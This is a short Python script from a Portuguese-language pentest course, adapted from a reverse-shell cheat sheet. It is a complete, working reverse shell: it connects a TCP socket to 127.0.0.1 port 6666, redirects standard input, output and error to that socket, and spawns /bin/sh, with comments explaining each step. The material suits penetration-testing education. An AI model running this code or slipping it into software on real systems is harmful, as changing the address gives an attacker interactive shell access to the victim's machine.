##INTRODUÇÃO AO HACKING E PENTEST: Cliente TCP
##Desenvolvido por:     Jhordan Silveira de Borba
##E-mail:               jhordandecacapava@gmail.com
##Website:              https://sapogithub.github.io
##Mais informações:     https://github.com/SapoGitHub/Repositorio-Geral/tree/master/Introdu%C3%A7%C3%A3o%20ao%20Hacking%20e%20Pentest
##2018

#Original: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

import socket           #Módulo para a conexão via socket
import subprocess       #Módulo para chamar subprocessos
import os               #Módulo com comandos relacionados ao sistema operacional

#Vamos criar um cliente TCP
soquete=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    #Configura o socket
soquete.connect(("127.0.0.1",6666))                         #Conecta nosso servidor

#'Redirecionar' as entradas e saidas pro socket
os.dup2(soquete.fileno(),0)	    			    #Duplica o descritor do soquete para 0
os.dup2(soquete.fileno(),1)	    			    #Duplica o descritor 'das' para 1
os.dup2(soquete.fileno(),2)	    			    #Duplica o descritor 'das' para 2

#Executar a shell
subprocess.call(["/bin/sh"])                                #Executamos a shell
